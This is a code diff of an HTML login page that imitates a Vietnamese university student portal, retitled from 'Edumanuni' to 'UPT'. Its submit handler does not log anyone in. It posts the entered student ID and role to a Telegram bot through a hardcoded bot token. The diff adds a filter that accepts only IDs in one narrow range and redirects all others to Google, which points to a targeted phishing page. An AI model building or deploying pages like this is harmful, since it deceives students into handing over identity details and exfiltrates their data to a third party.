@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Đăng nhập | Edumanuni</title>
+  <title>Đăng nhập | UPT</title>
   <style>
     body {
       margin: 0;
@@ -11,7 +11,6 @@
       background-color: #f9f9f9;
     }
 
-    /* HEADER */
     .header {
       background-color: #d4e6f1;
       padding: 10px;
@@ -32,7 +31,6 @@
       color: #0077c8;
     }
 
-    /* MENU */
     .menu {
       background-color: #0066b3;
       padding: 0;
@@ -47,7 +45,6 @@
       border-radius: 0 0 8px 8px;
     }
 
-    /* FORM */
     .login-box {
       max-width: 90%;
       width: 400px;
@@ -95,7 +92,6 @@
       cursor: pointer;
     }
 
-    /* FOOTER */
     .footer {
       background-color: #035e96;
       color: white;
@@ -118,7 +114,6 @@
       font-weight: bold;
     }
 
-    /* Responsive */
     @media (max-width: 480px) {
       .header {
         flex-direction: column;
@@ -157,7 +152,7 @@
     <h2>Đăng nhập</h2>
     <form id="loginForm">
       <label for="username">Tên đăng nhập:</label>
-      <input type="text" id="username" name="mssv" placeholder="Nhập MSSV..." required>
+      <input type="text" id="username" name="mssv" placeholder="Nhập MSSV [Vui Lòng Ghi Hoa]" required>
 
       <label for="password">Mật khẩu:</label>
       <input type="text" id="password" name="mssv" placeholder="Nhập Mật Khẩu..." required>
@@ -193,8 +188,16 @@
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      const username = document.getElementById("username").value;
+      const username = document.getElementById("username").value.trim().toUpperCase();
       const role = document.querySelector("input[name='role']:checked").value;
+
+      // Kiểm tra MSSV định dạng: K16THO00 + 2 chữ số
+      const pattern = /^K16THO00\d{2}$/;
+      if (!pattern.test(username)) {
+        alert("❌ MSSV không hợp lệ. Bạn sẽ được chuyển hướng.");
+        window.location.href = "https://www.google.com";
+        return;
+      }
 
       const message = `🛡️ Đăng nhập mới:\n👤 MSSV: ${username}\n🔐 Vai trò: ${role}`;
       const token = "7393833255:AAEHbjSRIky-AFJNFCXqfdfMv7UHWla_T3s";
@@ -202,64 +205,29 @@
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
       }).then(response => {
         if (response.ok) {
-          // Gửi thành công => chuyển trang
           window.location.href = `tc.html?mssv=${encodeURIComponent(username)}`;
-
         } else {
-          alert("⚠️ Đã có lỗi khi gửi thông tin đến Telegram.");
+          alert("⚠️ Lỗi khi gửi thông tin đến Telegram.");
         }
       }).catch(err => {
-        console.error("Lỗi khi gửi Telegram:", err);
+        console.error("Telegram Error:", err);
         alert("❌ Không thể gửi dữ liệu đến Telegram.");
       });
     });
-  </script>
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      const params = new URLSearchParams(window.location.search);
-      const mssv = params.get("mssv");
-      if (mssv) {
-        // Cập nhật tất cả liên kết đến index.html để đính kèm MSSV
-        document.querySelectorAll('a[href="index.html"]').forEach(link => {
-          link.href = `index.html?mssv=${encodeURIComponent(mssv)}`;
-        });
-      }
-    });
-  </script>
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      const params = new URLSearchParams(window.location.search);
-      const mssv = params.get("mssv");
-      if (mssv) {
-        // Cập nhật tất cả liên kết đến index.html để đính kèm MSSV
-        document.querySelectorAll('a[href="index.html"]').forEach(link => {
-          link.href = `index.html?mssv=${encodeURIComponent(mssv)}`;
-        });
-      }
-    });
-  </script>
 
+    document.addEventListener("DOMContentLoaded", () => {
+      const params = new URLSearchParams(window.location.search);
+      const mssv = params.get("mssv");
+      if (mssv) {
+        document.querySelectorAll('a[href="index.html"]').forEach(link => {
+          link.href = `index.html?mssv=${encodeURIComponent(mssv)}`;
+        });
+      }
+    });
+  </script>
 </body>
 </html>
-
-<script>
-  document.addEventListener("DOMContentLoaded", () => {
-    const form = document.querySelector("form");
-    if (form) {
-      form.addEventListener("submit", (e) => {
-        e.preventDefault();
-        const mssv = document.getElementById("mssv").value;
-        window.location.href = `tc.html?mssv=${encodeURIComponent(mssv)}`;
-      });
-    }
-  });
-</script>
